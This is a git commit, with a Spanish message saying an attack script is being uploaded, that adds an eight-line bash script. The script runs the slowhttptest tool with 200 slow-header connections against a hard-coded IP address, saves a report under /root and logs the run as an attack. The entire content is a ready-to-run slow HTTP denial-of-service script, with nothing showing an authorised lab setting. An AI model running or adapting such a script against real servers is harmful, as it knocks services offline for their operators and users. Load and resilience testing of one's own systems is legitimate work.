40f90f06ef9a8883e985dcbecb7dea5dc2f31253
AlanMorales123 <alannoemorales@gmail.com>
2025-07-13 17:56:52 -0600

    Subiendo mi script de ataque

---
+++ script-ataquedos.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+# Parámetros del ataque
+SERVIDOR="http://172.233.155.195/"
+CONEXIONES=200
+REPORTE="/root/slowhttp-$(date +%Y-%m-%d-%H-%M-%S)"
+# Ejecuta slowhttptest
+slowhttptest -c $CONEXIONES -H -g -o $REPORTE -i 10 -r 100 -t GET -u $SERVIDOR
+echo "Ataque Slow HTTP realizado en $(date). Revisa el reporte $REPORTE.html" >> /root/ataques.log
